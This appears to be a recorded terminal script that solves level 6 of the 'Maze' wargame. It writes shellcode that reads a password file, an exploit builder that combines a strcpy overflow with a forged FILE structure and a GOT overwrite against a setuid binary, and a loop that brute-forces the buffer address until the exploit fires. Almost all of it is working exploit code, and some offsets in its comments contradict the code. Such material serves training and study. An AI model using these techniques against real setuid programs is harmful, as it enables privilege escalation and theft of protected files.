@@ -1,0 +1,185 @@
+@sleep 1
+id
+echo '# Maze L6: /maze/maze6 (setuid maze7): unbounded strcpy(buf[0x100], argv[2]) + memfrob(XOR 42)'
+ls -la /maze/maze6
+objdump -d -M intel /maze/maze6 --section=.text | grep -A6 '<main>:' | head -14
+echo '# memfrob is an involution: argv[2] = payload^42; main ends with exit(0) so the'
+echo '# saved EIP is dead: repair the caller frame, forge the FILE* (FSOP) to make'
+echo '# fprintf memcpy the line into exit@GOT landing leave;ret, pivot to shellcode.'
+echo '# Writing the shellcode builder (heredoc, code visible):'
+@line cat > /run/screen/l6/sc.py <<'PYEOF'
+@line #!/usr/bin/env python3
+@line """Maze L6 shellcode: open/read/write /etc/maze_pass/maze7 (NUL-free, no '*').
+@line 
+@line Path built on the stack via pushes (NUL via a pre-push of eax); read into a
+@line buffer allocated below the strings (sub esp); written to fd 1; exit.
+@line Avoids NUL and '*' (0x2a) in every byte (argv[2] must be NUL-free, and a raw
+@line 0x2a would become NUL in argv[2] via the frob encoding).
+@line """
+@line import sys
+@line 
+@line sc = bytes([
+@line     0x31, 0xC0,                       # xor eax, eax
+@line     0x50,                             # push eax            (NUL terminator for path)
+@line     0x68, 0x61, 0x7A, 0x65, 0x37,     # push "aze7"
+@line     0x68, 0x73, 0x73, 0x2F, 0x6D,     # push "ss/m"
+@line     0x68, 0x65, 0x5F, 0x70, 0x61,     # push "e_pa"
+@line     0x68, 0x2F, 0x6D, 0x61, 0x7A,     # push "/maz"
+@line     0x68, 0x2F, 0x65, 0x74, 0x63,     # push "/etc"
+@line     0x89, 0xE3,                       # mov ebx, esp        (path)
+@line     0x31, 0xC9,                       # xor ecx, ecx        (O_RDONLY)
+@line     0xB0, 0x05,                       # mov al, 5           (open)
+@line     0xCD, 0x80,                       # int 0x80
+@line     0x89, 0xC3,                       # mov ebx, eax        (fd)
+@line     0x83, 0xEC, 0x20,                 # sub esp, 0x20       (buffer)
+@line     0x89, 0xE1,                       # mov ecx, esp        (buf)
+@line     0x31, 0xD2,                       # xor edx, edx
+@line     0xB2, 0x0F,                       # mov dl, 15          (count)
+@line     0xB0, 0x03,                       # mov al, 3           (read)
+@line     0xCD, 0x80,                       # int 0x80
+@line     0x31, 0xDB,                       # xor ebx, ebx
+@line     0xB3, 0x01,                       # mov bl, 1           (fd 1)
+@line     0x89, 0xE1,                       # mov ecx, esp        (buf)
+@line     0x89, 0xC2,                       # mov edx, eax        (nread)
+@line     0xB0, 0x04,                       # mov al, 4           (write)
+@line     0xCD, 0x80,                       # int 0x80
+@line     0x31, 0xDB,                       # xor ebx, ebx
+@line     0xB0, 0x01,                       # mov al, 1           (exit)
+@line     0xCD, 0x80,                       # int 0x80
+@line ])
+@line 
+@line if __name__ == "__main__":
+@line     bad = set(b"\x00\x2a")
+@line     assert not (bad & set(sc)), [hex(b) for b in sc if b in bad]
+@line     assert 0 not in bytes(b ^ 42 for b in sc), "frobbed sc has NUL"
+@line     sys.stdout.buffer.write(sc)
+@line PYEOF
+echo '# Writing the exploit builder (heredoc, code visible):'
+@line cat > /run/screen/l6/exploit.py <<'PYEOF'
+@line #!/usr/bin/env python3
+@line """Maze L6 exploit builder v5.
+@line 
+@line Stack layout (measured with the raw ~519-byte payload, gdb --args):
+@line     buf         = ebp - 0x104          (strcpy target, 0x100 bytes)
+@line     buf+0x100   = FILE* f              (overwrite -> fake FILE at buf+0x220)
+@line     buf+0x104   = saved ebx (0x0804b11c)
+@line     buf+0x108   = saved eip            (dead: main ends with exit(0))
+@line     buf+0x10c   = argc (3)             -- caller frame, OVERFLOW-REACHABLE
+@line     buf+0x110   = argv pointer         -- repair -> buf+0x1d0
+@line     buf+0x114   = envp pointer         -- repair -> buf+0x1dc (argv NULL slot)
+@line     buf+0x1d0   = argv[0..2] + NULL    -- INSIDE the overflow, repair pointers
+@line     buf+0x220   = fake FILE (copy of the real heap FILE, redirected write pointers)
+@line     buf+0x2c0   = shellcode (open/read/write /etc/maze_pass/maze7 -> fd 1)
+@line 
+@line buf[0..4] = leave;ret (libc+0x1af32e): the fprintf line "path : buf" starts at
+@line exit@GOT-24, so buf[0..4] lands exactly on exit@GOT. After fprintf, `call
+@line exit@plt -> jmp *GOT` runs leave;ret: esp := ebp, pop ebp, ret -> eip =
+@line [buf+0x108] = shellcode.
+@line 
+@line Raw payload may contain NULs (they ride in argv[2] as 0x2a bytes and memfrob
+@line restores them after the full-length strlen); argv[2] itself must be NUL-free,
+@line so the raw payload must not contain 0x2a.
+@line """
+@line import struct, sys
+@line 
+@line LIBC = 0xF7D6D000
+@line GADGET_LEAVE_RET = LIBC + 0x1AF32E          # leave; ret
+@line SAVED_EBX        = 0x0804B11C
+@line 
+@line EXIT_GOT = 0x0804B228
+@line FAKE_OFF = 0x1E0                            # fake FILE inside buf (right after argv[])
+@line PATH_OFF = 0x284                            # path string copy inside buf (NUL-terminated)
+@line SC_OFF   = 0x2A0                            # shellcode inside buf (after the path copy)
+@line ARGV_OFF = 0x1D0                            # argv[0..2] + NULL
+@line STR_A0   = 0x318                            # "/run/screen/l6/m6" (rel. buf)
+@line STR_A1   = 0x32A                            # path            (rel. buf)
+@line STR_A2   = 0x340                            # payload text    (rel. buf)
+@line 
+@line REAL_FILE = bytes.fromhex(
+@line     "84 3c ad fb 50 c1 04 08 50 c1 04 08 50 c1 04 08 "
+@line     "50 c1 04 08 6d c1 04 08 50 d1 04 08 50 c1 04 08 "
+@line     "50 d1 04 08 00 00 00 00 00 00 00 00 00 00 00 00 "
+@line     "00 00 00 00 40 3c fa f7 03 00 00 00 00 00 00 00 "
+@line     "00 00 00 00 00 00 00 00 a8 c0 04 08 ff ff ff ff "
+@line     "ff ff ff ff 00 00 00 00 b4 c0 04 08 00 00 00 00 "
+@line     "00 00 00 00 20 3c fa f7 ff ff ff ff 00 00 00 00 "
+@line     "00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
+@line     "00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
+@line     "00 00 00 00 a8 27 fa f7 00 00 00 00 00 00 00 00"
+@line )
+@line 
+@line def build(buf_addr: int, path: bytes, shellcode: bytes) -> bytes:
+@line     line_prefix = len(path) + 3
+@line     fake = buf_addr + FAKE_OFF
+@line     wbase = EXIT_GOT - line_prefix
+@line 
+@line     fp = bytearray(REAL_FILE)
+@line     fp[0x10:0x14] = struct.pack("<I", wbase)           # _IO_write_base
+@line     fp[0x14:0x18] = struct.pack("<I", wbase)           # _IO_write_ptr
+@line     fp[0x18:0x1c] = struct.pack("<I", wbase + 0x800)   # _IO_write_end
+@line     fp[0x1c:0x20] = struct.pack("<I", wbase)           # _IO_buf_base
+@line     fp[0x20:0x24] = struct.pack("<I", wbase + 0x800)   # _IO_buf_end
+@line 
+@line     p = bytearray(b"A" * 0x100)
+@line     p[0:4] = struct.pack("<I", GADGET_LEAVE_RET)        # buf[0..4] -> exit@GOT
+@line     p += struct.pack("<I", fake)                        # f @ buf+0x100
+@line     p += struct.pack("<I", SAVED_EBX)                   # saved ebx
+@line     p += struct.pack("<I", buf_addr + SC_OFF)           # saved eip (pivot target)
+@line     p += struct.pack("<I", 3)                           # argc
+@line     p += struct.pack("<I", buf_addr + ARGV_OFF)         # argv pointer
+@line     p += struct.pack("<I", buf_addr + ARGV_OFF + 0xc)   # envp pointer
+@line     p += b"B" * (ARGV_OFF - len(p))
+@line     p += struct.pack("<I", buf_addr + STR_A0)           # argv[0]
+@line     p += struct.pack("<I", buf_addr + PATH_OFF)         # argv[1] -> path INSIDE payload
+@line     p += struct.pack("<I", buf_addr + STR_A2)           # argv[2]
+@line     p += struct.pack("<I", 0)                           # argv NULL
+@line     p += fp
+@line     p += b"C" * (PATH_OFF - len(p))
+@line     p += path + b"\x00"                                 # the path string, payload-internal
+@line     p += b"C" * (SC_OFF - len(p))
+@line     p += shellcode
+@line 
+@line     assert 0x2a not in p, "raw payload has 0x2a -> NUL in argv[2]"
+@line     argv2 = bytes(b ^ 42 for b in p)
+@line     assert 0 not in argv2, "argv[2] has NUL"
+@line     return argv2
+@line 
+@line if __name__ == "__main__":
+@line     buf = int(sys.argv[1], 16)
+@line     path = sys.argv[2].encode()
+@line     sc = bytes.fromhex(sys.argv[3])
+@line     sys.stdout.buffer.write(build(buf, path, sc))
+@line PYEOF
+mkdir -p /run/screen/l6 && cd /run/screen/l6
+python3 sc.py > sc.bin && wc -c sc.bin
+echo '# sweep buf +-0x1000 step 4 in THIS session (the address is env-dependent):'
+@line cat > /run/screen/l6/fire.py <<'PYEOF'
+@line import subprocess, importlib.util
+@line spec = importlib.util.spec_from_file_location("exploit", "/run/screen/l6/exploit.py")
+@line ex = importlib.util.module_from_spec(spec)
+@line spec.loader.exec_module(ex)
+@line sc = open("/run/screen/l6/sc.bin", "rb").read()
+@line path = b"/run/screen/l6/wP.txt"
+@line for delta in range(-0x1000, 0x1001, 4):
+@line     buf = 0xffffd824 + delta
+@line     try:
+@line         pay = ex.build(buf, path, sc)
+@line     except AssertionError:
+@line         continue
+@line     try:
+@line         r = subprocess.run(["/maze/maze6", path, pay], capture_output=True, timeout=5)
+@line     except subprocess.TimeoutExpired:
+@line         continue
+@line     if r.returncode == 0 and r.stdout:
+@line         print("HIT buf", hex(buf))
+@line         print(r.stdout.decode("latin-1"))
+@line         break
+@line else:
+@line     print("none")
+@line PYEOF
+timeout 400 python3 fire.py
+echo rc=$?
+echo '# Verify (the shellcode read /etc/maze_pass/maze7 as euid maze7):'
+cat /etc/maze_pass/maze7
+@sleep 2
+exit
